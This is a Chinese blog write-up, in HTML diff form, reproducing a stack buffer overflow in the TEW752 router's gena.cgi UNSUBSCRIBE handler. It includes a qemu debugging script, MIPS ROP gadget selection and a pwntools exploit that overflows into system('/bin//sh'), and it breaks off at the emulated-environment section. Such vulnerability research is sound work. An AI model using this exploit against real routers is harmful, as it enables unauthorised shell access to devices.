@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前期准备\r固件下载链接：TEW752 静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析 函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。 但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现 同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件 分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关： 并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据： 考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。 模拟路由器环境 构造HTTP请求（溢出HTTP_SID/SERVICE） TCP scoket来发送请求 路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。 动态调试\r1 测偏移\r先用cyclic 2000 &gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式 1 2 3 4 5 #!/bin/bash service=&#34;?service=`cat test`&#34; qemu-mipsel-static -L ./ -g 1234 -0 &#34;gena.cgi&#34; -E REQUEST_METHOD=&#34;UNSUBSCRIBE&#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=&#34;192.168.182.14&#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474 2 找基址\r由于使用vmmap命令无法得到libc的基址 所以，这里仍然根据延迟绑定机制来计算libc的基址 0x3ff8a060 - 0x52060 = 0x3ff38000 所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址 3 找gadget\r考虑利用system函数来得到shell">
+<title>TEW752</title>
+
+<link rel='canonical' href='https://zhu1ang.github.io/p/tew752/'>
+
+<link rel="stylesheet" href="/scss/style.min.216e53d7a01afaa5919cc32112b77387d0d40b4fe7914c1ed88f339eb8b79fb5.css"><meta property='og:title' content="TEW752">
+<meta property='og:description' content="前期准备\r固件下载链接：TEW752 静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析 函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。 但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现 同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件 分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关： 并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据： 考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。 模拟路由器环境 构造HTTP请求（溢出HTTP_SID/SERVICE） TCP scoket来发送请求 路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。 动态调试\r1 测偏移\r先用cyclic 2000 &gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式 1 2 3 4 5 #!/bin/bash service=&#34;?service=`cat test`&#34; qemu-mipsel-static -L ./ -g 1234 -0 &#34;gena.cgi&#34; -E REQUEST_METHOD=&#34;UNSUBSCRIBE&#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=&#34;192.168.182.14&#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474 2 找基址\r由于使用vmmap命令无法得到libc的基址 所以，这里仍然根据延迟绑定机制来计算libc的基址 0x3ff8a060 - 0x52060 = 0x3ff38000 所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址 3 找gadget\r考虑利用system函数来得到shell">
+<meta property='og:url' content='https://zhu1ang.github.io/p/tew752/'>
+<meta property='og:site_name' content='剑饮雪'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='iot' /><meta property='article:tag' content='漏洞复现' /><meta property='article:published_time' content='2024-09-04T16:42:46&#43;08:00'/><meta property='article:modified_time' content='2024-09-04T16:42:46&#43;08:00'/>
+<meta name="twitter:title" content="TEW752">
+<meta name="twitter:description" content="前期准备\r固件下载链接：TEW752 静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析 函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。 但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现 同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件 分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关： 并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据： 考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。 模拟路由器环境 构造HTTP请求（溢出HTTP_SID/SERVICE） TCP scoket来发送请求 路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。 动态调试\r1 测偏移\r先用cyclic 2000 &gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式 1 2 3 4 5 #!/bin/bash service=&#34;?service=`cat test`&#34; qemu-mipsel-static -L ./ -g 1234 -0 &#34;gena.cgi&#34; -E REQUEST_METHOD=&#34;UNSUBSCRIBE&#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=&#34;192.168.182.14&#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474 2 找基址\r由于使用vmmap命令无法得到libc的基址 所以，这里仍然根据延迟绑定机制来计算libc的基址 0x3ff8a060 - 0x52060 = 0x3ff38000 所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址 3 找gadget\r考虑利用system函数来得到shell">
+    <link rel="shortcut icon" href="/static/images/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Ukenn2112/UkennWeb@3.0/index/web.js"></script>
+        <div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/ico_hu627d1395d31b147b1726fc8be242e34e_39784_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">剑饮雪</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/zhu1ang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#前期准备">前期准备</a></li>
+        <li><a href="#静态分析">静态分析</a></li>
+        <li><a href="#路由器模拟">路由器模拟</a></li>
+        <li><a href="#动态调试">动态调试</a>
+          <ol>
+            <li><a href="#1-测偏移">1 测偏移</a></li>
+            <li><a href="#2-找基址">2 找基址</a></li>
+            <li><a href="#3-找gadget">3 找gadget</a></li>
+          </ol>
+        </li>
+        <li><a href="#本地利用">本地利用</a></li>
+        <li><a href="#模拟环境利用">模拟环境利用</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >
+                学习笔记
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tew752/">TEW752</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 04, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="前期准备">前期准备
+</h3><p>固件下载链接：<a class="link" href="https://github.com/zhu1ang/Image/tree/main/"  target="_blank" rel="noopener"
+    >TEW752</a></p>
+<h3 id="静态分析">静态分析
+</h3><p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251438961.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725143817879"
+	
+	
+></p>
+<p>根据漏洞通报里的描述，漏洞存在于cgibin程序的<code>genacgi_main</code>函数，把cgibin放到IDA里分析</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251441663.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725144110633"
+	
+	
+></p>
+<p>函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251447308.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725144745270"
+	
+	
+></p>
+<p>但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251456363.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725145649333"
+	
+	
+></p>
+<p>同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251458010.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725145851983"
+	
+	
+></p>
+<p>分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251628979.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725162830870"
+	
+	
+></p>
+<p>并且<code>upnpsetup</code>函数会在接收请求后创建gena.cgi等文件，<code>upnpsetup</code>函数中还可以看到，可以通过49152端口向UPNP发送数据：</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251630096.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725163023059"
+	
+	
+></p>
+<p>考虑构造一个特定的<strong>HTTP UNSUBSCRIBE</strong>请求，其中包含足够长的数据，使得 <code>sprintf</code> 函数写入超过 <code>v5</code> （512）缓冲区的范围，从而触发栈溢出。</p>
+<ul>
+<li>
+<p>模拟路由器环境</p>
+</li>
+<li>
+<p>构造HTTP请求（溢出HTTP_SID/SERVICE）</p>
+</li>
+<li>
+<p>TCP scoket来发送请求</p>
+</li>
+</ul>
+<h3 id="路由器模拟">路由器模拟
+</h3><p>使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202407251705344.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240725170532197"
+	
+	
+></p>
+<h3 id="动态调试">动态调试
+</h3><h4 id="1-测偏移">1 测偏移
+</h4><p>先用<code>cyclic 2000 &gt; test</code>生成测试字符到test文件，再用如下脚本启动qemu用户模式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">service</span><span class="o">=</span><span class="s2">&#34;?service=`cat test`&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">qemu-mipsel-static -L ./ -g <span class="m">1234</span> -0 <span class="s2">&#34;gena.cgi&#34;</span> -E <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">&#34;UNSUBSCRIBE&#34;</span> -E <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="nv">$service</span> -E <span class="nv">HTTP_SID</span><span class="o">=</span><span class="m">1</span> -E <span class="nv">SERVER_ID</span><span class="o">=</span>LAN-3 -E <span class="nv">REMOTE_ADDR</span><span class="o">=</span><span class="s2">&#34;192.168.182.14&#34;</span> ./htdocs/cgibin
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121400707.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240812140012766"
+	
+	
+></p>
+<h4 id="2-找基址">2 找基址
+</h4><p>由于使用vmmap命令无法得到libc的基址</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121404929.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240812140413886"
+	
+	
+></p>
+<p>所以，这里仍然根据延迟绑定机制来计算libc的基址</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121522021.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240812152213978"
+	
+	
+></p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121523991.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240812152312960"
+	
+	
+></p>
+<p>0x3ff8a060 - 0x52060 = 0x3ff38000</p>
+<p>所以vmmap查看得到的，&lt; explored &gt;文件就是libc的基址</p>
+<h4 id="3-找gadget">3 找gadget
+</h4><p>考虑利用system函数来得到shell</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528692.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230802193139879"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mipsrop.stackfinder()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528690.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230802192201543"
+	
+	
+></p>
+<p>选择0x16824处的gadget</p>
+<p><code>$sp + 0x10</code>传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放<code>cmd</code></p>
+<p>跳转$s0。</p>
+<p>仍然需要防止坏字符00，所以找对$s0操作的gadget</p>
+<p>观察溢出函数处</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528693.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20230802194856043"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mipsrop.find(&#34;addiu $s0&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121528696.png?x-oss-process=style/zzz" alt="image-20230802195520866" style="zoom:80%;" />
+<p>$s1放上一个gadget</p>
+<p>$0 放system地址</p>
+<p>$ra 返回地址放第二个gadget</p>
+<h3 id="本地利用">本地利用
+</h3><p>根据测得的偏移和找到的基址以及gadget，编写exp如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&#34;little&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;mips&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_addr</span> <span class="o">=</span> <span class="mh">0x3ff38000</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span><span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget1</span> <span class="o">=</span>  <span class="mh">0x16824</span>
+</span></span><span class="line"><span class="cl"><span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x32a98</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x1ce</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> <span class="c1"># s0</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">gadget1</span> <span class="p">)</span>      <span class="c1"># s1</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">4</span>                           <span class="c1"># s2</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># ra</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;/bin//sh&#39;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;exploit&#34;</span><span class="p">,</span><span class="s1">&#39;wb+&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408121518900.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240812151811845"
+	
+	
+></p>
+<h3 id="模拟环境利用">模拟环境利用
